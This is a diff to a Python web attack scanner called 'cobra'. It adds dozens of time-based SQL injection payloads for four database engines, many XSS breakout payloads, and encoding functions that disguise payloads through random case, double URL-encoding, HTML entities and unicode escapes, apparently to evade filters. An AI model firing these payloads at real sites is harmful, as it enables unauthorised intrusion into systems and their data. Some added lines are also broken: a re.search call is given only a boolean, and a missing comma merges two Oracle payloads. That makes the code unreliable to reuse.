@@ -1,5 +1,6 @@
 import random
 import re
+import string
 import time
 import urllib.parse
 from urllib.error import HTTPError
@@ -11,7 +12,6 @@ CYAN = "\033[1;36m"
 GREEN = "\033[0;32m"
 RED = "\033[1;31m"
 
-
 def random_case(mal):
     my_random = ""
     for char in mal:
@@ -21,6 +21,66 @@ def random_case(mal):
             my_random += char.lower()
     
     return my_random
+
+def random_string():
+    length = random.randint(8, 35)
+    random_string = "".join(random.choices(string.ascii_letters + string.digits, k=length))
+    
+    return random_string
+
+def mal_percent_encoding(mal):
+    gather = []
+
+    gather.append(urllib.parse.quote(mal))
+    gather.append(urllib.parse.quote(urllib.parse.quote(mal)))
+    gather.append(urllib.parse.quote_plus(urllib.parse.quote(mal)))
+    gather.append(urllib.parse.quote_plus(mal))
+    gather.append(urllib.parse.quote(urllib.parse.quote_plus(mal)))
+    gather.append(urllib.parse.quote_plus(urllib.parse.quote_plus(mal)))
+    gather.append(random_case(urllib.parse.quote(mal)))
+    gather.append(random_case(urllib.parse.quote(urllib.parse.quote(mal))))
+    gather.append(random_case(urllib.parse.quote_plus(urllib.parse.quote(mal))))
+    gather.append(random_case(urllib.parse.quote_plus(mal)))
+    gather.append(random_case(urllib.parse.quote(urllib.parse.quote_plus(mal))))
+    gather.append(random_case(urllib.parse.quote_plus(urllib.parse.quote_plus(mal))))
+
+    return gather
+
+def mal_changer(mal):
+    gather = []
+    gather.append(f"./{mal}")
+    gather.append(f"../{mal}")
+    gather.append("".join(["&#x{:x}".format(ord(char)) for char in mal]))
+    gather.append(mal.replace("'", "\\'").replace('"', '\\"'))
+    gather.append("".join(["\\u00{:x}".format(ord(char)) for char in mal]))
+    gather.append(random_case(f"./{mal}"))
+    gather.append(random_case(f"../{mal}"))
+    gather.append(random_case("".join(["&#x{:x}".format(ord(char)) for char in mal])))
+    gather.append(random_case(mal.replace("'", "\\'").replace('"', '\\"')))
+    gather.append(random_case("".join(["\\u00{:x}".format(ord(char)) for char in mal])))
+
+    return gather
+
+def mal_url_parser(mal):
+    gather = []
+
+    gather.append(random_case(mal))
+    gather.append(random_string() + mal)
+    gather.append(random_case(random_string() + mal))
+
+    new_gather = gather[:]
+    for i in new_gather:
+        results = (mal_changer(i))
+        for result in results:
+            gather.append(result)
+            
+    new_gather = gather[:]
+    for i in new_gather:
+        results = (mal_percent_encoding(i))
+        for result in results:
+            gather.append(result)
+
+    return gather
 
 def cobra(host,delay=0,crawl=1):
     clear()
@@ -42,18 +102,61 @@ def cobra(host,delay=0,crawl=1):
                  r"&#x1F431",
                  r"&#x1F346"]
 
-    mal_mssql = [r'WAITFOR DELAY "00:01"']
+    mal_mssql = [r'WAITFOR DELAY "00:01"',
+                 r'1 AND WAITFOR DELAY "00:01"',
+                 r'1 OR WAITFOR DELAY "00:01"',
+                 r'"1 AND WAITFOR DELAY "00:01"',
+                 r"'1 AND WAITFOR DELAY '00:01'",
+                 r'"1 OR WAITFOR DELAY "00:01"',
+                 r"'1 OR WAITFOR DELAY '00:01'",]
 
-    mal_mysql = [r"SELECT SLEEP(60);"]
+    mal_mysql = [r"SELECT SLEEP(60);",
+                 r"1 AND SELECT SLEEP(60);",
+                 r"1 OR SELECT SLEEP(60);",
+                 r"'1 AND SELECT SLEEP(60);",
+                 r'"1 AND SELECT SLEEP(60);',
+                 r"'1 OR SELECT SLEEP(60);",
+                 r'"1 OR SELECT SLEEP(60);',]
 
     mal_oracle = [r"DBMS_LOCK.sleep(60);",
-                  r"DBMS_SESSION.sleep(60);"]
+                  r"1 AND DBMS_LOCK.sleep(60);",
+                  r"1 OR DBMS_LOCK.sleep(60);",
+                  r"'1 AND DBMS_LOCK.sleep(60);",
+                  r'"1 AND DBMS_LOCK.sleep(60);',
+                  r"'1 OR DBMS_LOCK.sleep(60);",
+                  r'"1 OR DBMS_LOCK.sleep(60);',
+                  r"DBMS_SESSION.sleep(60);"
+                  r"1 AND DBMS_SESSION.sleep(60);",
+                  r"1 OR DBMS_SESSION.sleep(60);",
+                  r"'1 AND DBMS_SESSION.sleep(60);",
+                  r'"1 AND DBMS_SESSION.sleep(60);',
+                  r"'1 OR DBMS_SESSION.sleep(60);",
+                  r'"1 OR DBMS_SESSION.sleep(60);',]
+    
 
     mal_php = [r"sleep(60);"]
 
     mal_postgresql = [r"pg_sleep(60);",
+                      r"1 AND pg_sleep(60);",
+                      r"1 OR pg_sleep(60);",
+                      r"'1 AND pg_sleep(60);",
+                      r'"1 AND pg_sleep(60);',
+                      r"'1 OR pg_sleep(60);",
+                      r'"1 OR pg_sleep(60);',
                       r"PERFORM pg_sleep(60);",
-                      r"SELECT pg_sleep(60);"]
+                      r"1 AND PERFORM pg_sleep(60);",
+                      r"1 OR PERFORM pg_sleep(60);",
+                      r"'1 AND PERFORM pg_sleep(60);",
+                      r'"1 AND PERFORM pg_sleep(60);',
+                      r"'1 OR PERFORM pg_sleep(60);",
+                      r'"1 OR PERFORM pg_sleep(60);',
+                      r"SELECT pg_sleep(60);",
+                      r"1 AND SELECT pg_sleep(60);",
+                      r"1 OR SELECT pg_sleep(60);",
+                      r"'1 AND SELECT pg_sleep(60);",
+                      r'"1 AND SELECT pg_sleep(60);',
+                      r"'1 OR SELECT pg_sleep(60);",
+                      r'"1 OR SELECT pg_sleep(60);',]
 
     mal_powershell = [r"start-sleep -seconds 60"]
 
@@ -73,193 +176,121 @@ def cobra(host,delay=0,crawl=1):
                r"<script>prompt('cobra')</script>",
                r"<strong>cobra</strong>",
                r"<style>body{background-color:red;}</style>",
-               r"<title>cobra</title>"]
+               r"<title>cobra</title>",
+               r"' <iframe>cobra</iframe>",
+               r"' <p>cobra</p>",
+               r"' <script>alert('cobra')</script>",
+               r"' <script>prompt('cobra')</script>",
+               r"' <strong>cobra</strong>",
+               r"' <style>body{background-color:red;}</style>",
+               r"' <title>cobra</title>",
+               r'" <iframe>cobra</iframe>',
+               r'" <p>cobra</p>',
+               r'" <script>alert("cobra")</script>',
+               r'" <script>prompt("cobra")</script>',
+               r'" <strong>cobra</strong>',
+               r'" <style>body{background-color:red;}</style>',
+               r'" <title>cobra</title>',
+               r"'/> <iframe>cobra</iframe>",
+               r"'/> <p>cobra</p>",
+               r"'/> <script>alert('cobra')</script>",
+               r"'/> <script>prompt('cobra')</script>",
+               r"'/> <strong>cobra</strong>",
+               r"'/> <style>body{background-color:red;}</style>",
+               r"'/> <title>cobra</title>",
+               r'"/> <iframe>cobra</iframe>',
+               r'"/> <p>cobra</p>',
+               r'"/> <script>alert("cobra")</script>',
+               r'"/> <script>prompt("cobra")</script>',
+               r'"/> <strong>cobra</strong>',
+               r'"/> <style>body{background-color:red;}</style>',
+               r'"/> <title>cobra</title>',
+               r"'> <iframe>cobra</iframe>",
+               r"'> <p>cobra</p>",
+               r"'> <script>alert('cobra')</script>",
+               r"'> <script>prompt('cobra')</script>",
+               r"'> <strong>cobra</strong>",
+               r"'> <style>body{background-color:red;}</style>",
+               r"'> <title>cobra</title>",
+               r'"> <iframe>cobra</iframe>',
+               r'"> <p>cobra</p>',
+               r'"> <script>alert("cobra")</script>',
+               r'"> <script>prompt("cobra")</script>',
+               r'"> <strong>cobra</strong>',
+               r'"> <style>body{background-color:red;}</style>',
+               r'"> <title>cobra</title>',
+               r"/> <iframe>cobra</iframe>",
+               r"/> <p>cobra</p>",
+               r"/> <script>alert('cobra')</script>",
+               r"/> <script>prompt('cobra')</script>",
+               r"/> <strong>cobra</strong>",
+               r"/> <style>body{background-color:red;}</style>",
+               r"/> <title>cobra</title>",
+               r"> <iframe>cobra</iframe>",
+               r"> <p>cobra</p>",
+               r"> <script>alert('cobra')</script>",
+               r"> <script>prompt('cobra')</script>",
+               r"> <strong>cobra</strong>",
+               r"> <style>body{background-color:red;}</style>",
+               r"> <title>cobra</title>"]
 
     init_mal_bash = mal_bash[:]
     for mal in init_mal_bash:
-        mal_bash.append(random_case(mal))
-        mal_bash.append(f"./{mal}")
-        mal_bash.append(f"../{mal}")
-        mal_bash.append(urllib.parse.quote(mal))
-        mal_bash.append(urllib.parse.quote(urllib.parse.quote(mal)))
-        mal_bash.append(urllib.parse.quote_plus(urllib.parse.quote(mal)))
-        mal_bash.append(urllib.parse.quote_plus(mal))
-        mal_bash.append(urllib.parse.quote(urllib.parse.quote_plus(mal)))
-        mal_bash.append(urllib.parse.quote_plus(urllib.parse.quote_plus(mal)))
-        mal_bash.append(random_case(f"./{mal}"))
-        mal_bash.append(random_case(f"../{mal}"))
-        mal_bash.append(random_case(urllib.parse.quote(mal)))
-        mal_bash.append(random_case(urllib.parse.quote(urllib.parse.quote(mal))))
-        mal_bash.append(random_case(urllib.parse.quote_plus(urllib.parse.quote(mal))))
-        mal_bash.append(random_case(urllib.parse.quote_plus(mal)))
-        mal_bash.append(random_case(urllib.parse.quote(urllib.parse.quote_plus(mal))))
-        mal_bash.append(random_case(urllib.parse.quote_plus(urllib.parse.quote_plus(mal))))
+        results = mal_url_parser(mal)
+        for result in results:
+            mal_bash.append(result)
+        
     
     init_mal_mssql = mal_mssql[:]
     for mal in init_mal_mssql:
-        mal_mssql.append(random_case(mal))
-        mal_mssql.append(f"./{mal}")
-        mal_mssql.append(f"../{mal}")
-        mal_mssql.append(urllib.parse.quote(mal))
-        mal_mssql.append(urllib.parse.quote(urllib.parse.quote(mal)))
-        mal_mssql.append(urllib.parse.quote_plus(urllib.parse.quote(mal)))
-        mal_mssql.append(urllib.parse.quote_plus(mal))
-        mal_mssql.append(urllib.parse.quote(urllib.parse.quote_plus(mal)))
-        mal_mssql.append(urllib.parse.quote_plus(urllib.parse.quote_plus(mal)))
-        mal_mssql.append(random_case(f"./{mal}"))
-        mal_mssql.append(random_case(f"../{mal}"))
-        mal_mssql.append(random_case(urllib.parse.quote(mal)))
-        mal_mssql.append(random_case(urllib.parse.quote(urllib.parse.quote(mal))))
-        mal_mssql.append(random_case(urllib.parse.quote_plus(urllib.parse.quote(mal))))
-        mal_mssql.append(random_case(urllib.parse.quote_plus(mal)))
-        mal_mssql.append(random_case(urllib.parse.quote(urllib.parse.quote_plus(mal))))
-        mal_mssql.append(random_case(urllib.parse.quote_plus(urllib.parse.quote_plus(mal))))
+        results = mal_url_parser(mal)
+        for result in results:
+            mal_mssql.append(result)
 
     init_mal_mysql = mal_mysql[:]
     for mal in init_mal_mysql:
-        mal_mysql.append(random_case(mal))
-        mal_mysql.append("".join(["&#{:x};".format(ord(char)) for char in mal]))
-        mal_mysql.append("".join(["&#x{:x}".format(ord(char)) for char in mal]))
-        mal_mysql.append(f"./{mal}")
-        mal_mysql.append(f"../{mal}")
-        mal_mysql.append(urllib.parse.quote(mal))
-        mal_mysql.append(urllib.parse.quote(urllib.parse.quote(mal)))
-        mal_mysql.append(urllib.parse.quote_plus(urllib.parse.quote(mal)))
-        mal_mysql.append(urllib.parse.quote_plus(mal))
-        mal_mysql.append(urllib.parse.quote(urllib.parse.quote_plus(mal)))
-        mal_mysql.append(urllib.parse.quote_plus(urllib.parse.quote_plus(mal)))
-        mal_mysql.append(random_case("".join(["&#{:x};".format(ord(char)) for char in mal])))
-        mal_mysql.append(random_case("".join(["&#x{:x}".format(ord(char)) for char in mal])))
-        mal_mysql.append(random_case(f"./{mal}"))
-        mal_mysql.append(random_case(f"../{mal}"))
-        mal_mysql.append(random_case(urllib.parse.quote(mal)))
-        mal_mysql.append(random_case(urllib.parse.quote(urllib.parse.quote(mal))))
-        mal_mysql.append(random_case(urllib.parse.quote_plus(urllib.parse.quote(mal))))
-        mal_mysql.append(random_case(urllib.parse.quote_plus(mal)))
-        mal_mysql.append(random_case(urllib.parse.quote(urllib.parse.quote_plus(mal))))
-        mal_mysql.append(random_case(urllib.parse.quote_plus(urllib.parse.quote_plus(mal))))
+        results = mal_url_parser(mal)
+        for result in results:
+            mal_mysql.append(result)
 
     init_mal_oracle = mal_oracle[:]
     for mal in init_mal_oracle:
-        mal_oracle.append(random_case(mal))
-        mal_oracle.append(f"./{mal}")
-        mal_oracle.append(f"../{mal}")
-        mal_oracle.append(urllib.parse.quote(mal))
-        mal_oracle.append(urllib.parse.quote(urllib.parse.quote(mal)))
-        mal_oracle.append(urllib.parse.quote_plus(urllib.parse.quote(mal)))
-        mal_oracle.append(urllib.parse.quote_plus(mal))
-        mal_oracle.append(urllib.parse.quote(urllib.parse.quote_plus(mal)))
-        mal_oracle.append(urllib.parse.quote_plus(urllib.parse.quote_plus(mal)))
-        mal_oracle.append(random_case(f"./{mal}"))
-        mal_oracle.append(random_case(f"../{mal}"))
-        mal_oracle.append(random_case(urllib.parse.quote(mal)))
-        mal_oracle.append(random_case(urllib.parse.quote(urllib.parse.quote(mal))))
-        mal_oracle.append(random_case(urllib.parse.quote_plus(urllib.parse.quote(mal))))
-        mal_oracle.append(random_case(urllib.parse.quote_plus(mal)))
-        mal_oracle.append(random_case(urllib.parse.quote(urllib.parse.quote_plus(mal))))
-        mal_oracle.append(random_case(urllib.parse.quote_plus(urllib.parse.quote_plus(mal))))
+        results = mal_url_parser(mal)
+        for result in results:
+            mal_oracle.append(result)
 
     init_mal_php = mal_php[:]
     for mal in init_mal_php:
-        mal_php.append(random_case(mal))
-        mal_php.append(f"./{mal}")
-        mal_php.append(f"../{mal}")
-        mal_php.append(urllib.parse.quote(mal))
-        mal_php.append(urllib.parse.quote(urllib.parse.quote(mal)))
-        mal_php.append(urllib.parse.quote_plus(urllib.parse.quote(mal)))
-        mal_php.append(urllib.parse.quote_plus(mal))
-        mal_php.append(urllib.parse.quote(urllib.parse.quote_plus(mal)))
-        mal_php.append(urllib.parse.quote_plus(urllib.parse.quote_plus(mal)))
-        mal_php.append(random_case(f"./{mal}"))
-        mal_php.append(random_case(f"../{mal}"))
-        mal_php.append(random_case(urllib.parse.quote(mal)))
-        mal_php.append(random_case(urllib.parse.quote(urllib.parse.quote(mal))))
-        mal_php.append(random_case(urllib.parse.quote_plus(urllib.parse.quote(mal))))
-        mal_php.append(random_case(urllib.parse.quote_plus(mal)))
-        mal_php.append(random_case(urllib.parse.quote(urllib.parse.quote_plus(mal))))
-        mal_php.append(random_case(urllib.parse.quote_plus(urllib.parse.quote_plus(mal))))
+        results = mal_url_parser(mal)
+        for result in results:
+            mal_php.append(result)       
+        
 
     init_mal_postgresql = mal_postgresql[:]
     for mal in init_mal_postgresql:
-        mal_postgresql.append(random_case(mal))
-        mal_postgresql.append(f"./{mal}")
-        mal_postgresql.append(f"../{mal}")
-        mal_postgresql.append(urllib.parse.quote(mal))
-        mal_postgresql.append(urllib.parse.quote(urllib.parse.quote(mal)))
-        mal_postgresql.append(urllib.parse.quote_plus(urllib.parse.quote(mal)))
-        mal_postgresql.append(urllib.parse.quote_plus(mal))
-        mal_postgresql.append(urllib.parse.quote(urllib.parse.quote_plus(mal)))
-        mal_postgresql.append(urllib.parse.quote_plus(urllib.parse.quote_plus(mal)))
-        mal_postgresql.append(random_case(f"./{mal}"))
-        mal_postgresql.append(random_case(f"../{mal}"))
-        mal_postgresql.append(random_case(urllib.parse.quote(mal)))
-        mal_postgresql.append(random_case(urllib.parse.quote(urllib.parse.quote(mal))))
-        mal_postgresql.append(random_case(urllib.parse.quote_plus(urllib.parse.quote(mal))))
-        mal_postgresql.append(random_case(urllib.parse.quote_plus(mal)))
-        mal_postgresql.append(random_case(urllib.parse.quote(urllib.parse.quote_plus(mal))))
-        mal_postgresql.append(random_case(urllib.parse.quote_plus(urllib.parse.quote_plus(mal))))
+        results = mal_url_parser(mal)
+        for result in results:
+            mal_postgresql.append(result)
 
     init_mal_powershell = mal_powershell[:]
     for mal in init_mal_powershell:
-        mal_powershell.append(random_case(mal))
-        mal_powershell.append(f"./{mal}")
-        mal_powershell.append(f"../{mal}")
-        mal_powershell.append(urllib.parse.quote(mal))
-        mal_powershell.append(urllib.parse.quote(urllib.parse.quote(mal)))
-        mal_powershell.append(urllib.parse.quote_plus(urllib.parse.quote(mal)))
-        mal_powershell.append(urllib.parse.quote_plus(mal))
-        mal_powershell.append(urllib.parse.quote(urllib.parse.quote_plus(mal)))
-        mal_powershell.append(urllib.parse.quote_plus(urllib.parse.quote_plus(mal)))
-        mal_powershell.append(random_case(f"./{mal}"))
-        mal_powershell.append(random_case(f"../{mal}"))
-        mal_powershell.append(random_case(urllib.parse.quote(mal)))
-        mal_powershell.append(random_case(urllib.parse.quote(urllib.parse.quote(mal))))
-        mal_powershell.append(random_case(urllib.parse.quote_plus(urllib.parse.quote(mal))))
-        mal_powershell.append(random_case(urllib.parse.quote_plus(mal)))
-        mal_powershell.append(random_case(urllib.parse.quote(urllib.parse.quote_plus(mal))))
-        mal_powershell.append(random_case(urllib.parse.quote_plus(urllib.parse.quote_plus(mal))))
+        results = mal_url_parser(mal)
+        for result in results:
+            mal_powershell.append(result)
+
+        
 
     init_mal_python = mal_python[:]
     for mal in init_mal_python:
-        mal_python.append(random_case(mal))
-        mal_python.append(f"./{mal}")
-        mal_python.append(f"../{mal}")
-        mal_python.append(urllib.parse.quote(mal))
-        mal_python.append(urllib.parse.quote(urllib.parse.quote(mal)))
-        mal_python.append(urllib.parse.quote_plus(urllib.parse.quote(mal)))
-        mal_python.append(urllib.parse.quote_plus(mal))
-        mal_python.append(urllib.parse.quote(urllib.parse.quote_plus(mal)))
-        mal_python.append(urllib.parse.quote_plus(urllib.parse.quote_plus(mal)))
-        mal_python.append(random_case(f"./{mal}"))
-        mal_python.append(random_case(f"../{mal}"))
-        mal_python.append(random_case(urllib.parse.quote(mal)))
-        mal_python.append(random_case(urllib.parse.quote(urllib.parse.quote(mal))))
-        mal_python.append(random_case(urllib.parse.quote_plus(urllib.parse.quote(mal))))
-        mal_python.append(random_case(urllib.parse.quote_plus(mal)))
-        mal_python.append(random_case(urllib.parse.quote(urllib.parse.quote_plus(mal))))
-        mal_python.append(random_case(urllib.parse.quote_plus(urllib.parse.quote_plus(mal))))
+        results = mal_url_parser(mal)
+        for result in results:
+            mal_python.append(result)
 
     init_mal_xss = mal_xss[:]
     for mal in init_mal_xss:
-        mal_xss.append(random_case(mal))
-        mal_xss.append("".join(["&#x{:x};".format(ord(char)) for char in mal]))
-        mal_xss.append(f"./{mal}")
-        mal_xss.append(f"../{mal}")
-        mal_xss.append(urllib.parse.quote(mal))
-        mal_xss.append(urllib.parse.quote(urllib.parse.quote(mal)))
-        mal_xss.append(urllib.parse.quote_plus(urllib.parse.quote(mal)))
-        mal_xss.append(urllib.parse.quote_plus(mal))
-        mal_xss.append(urllib.parse.quote(urllib.parse.quote_plus(mal)))
-        mal_xss.append(urllib.parse.quote_plus(urllib.parse.quote_plus(mal)))
-        mal_xss.append(random_case("".join(["&#x{:x};".format(ord(char)) for char in mal])))
-        mal_xss.append(random_case(f"./{mal}"))
-        mal_xss.append(random_case(f"../{mal}"))
-        mal_xss.append(random_case(urllib.parse.quote(mal)))
-        mal_xss.append(random_case(urllib.parse.quote(urllib.parse.quote(mal))))
-        mal_xss.append(random_case(urllib.parse.quote_plus(urllib.parse.quote(mal))))
-        mal_xss.append(random_case(urllib.parse.quote_plus(mal)))
-        mal_xss.append(random_case(urllib.parse.quote(urllib.parse.quote_plus(mal))))
-        mal_xss.append(random_case(urllib.parse.quote_plus(urllib.parse.quote_plus(mal))))
+        results = mal_url_parser(mal)
+        for result in results:
+            mal_xss.append(result)
 
     hosts = kitten_crawler(host,delay,crawl)
 
@@ -1305,7 +1336,7 @@ def cobra(host,delay=0,crawl=1):
 
             # check for xss
             for mal in mal_xss:
-                if "%" not in mal:
+                if "%" not in mal and "\\u" not in mal.lower() and not re.search("cu.*%" not in mal.lower()) and not re.search("%.*cu" not in mal.lower()):
                     print(CYAN + f"checking: {_} with xss payload {mal}")
                     try:
                         time.sleep(delay)
@@ -1415,4 +1446,4 @@ def cobra(host,delay=0,crawl=1):
     else:
         print(GREEN + f"we didn't find anything interesting on {host}")
         with open("cobra.log", "a") as file:
-                file.write(f"we didn't find anything interesting on {host}\n")
+            file.write(f"we didn't find anything interesting on {host}\n")
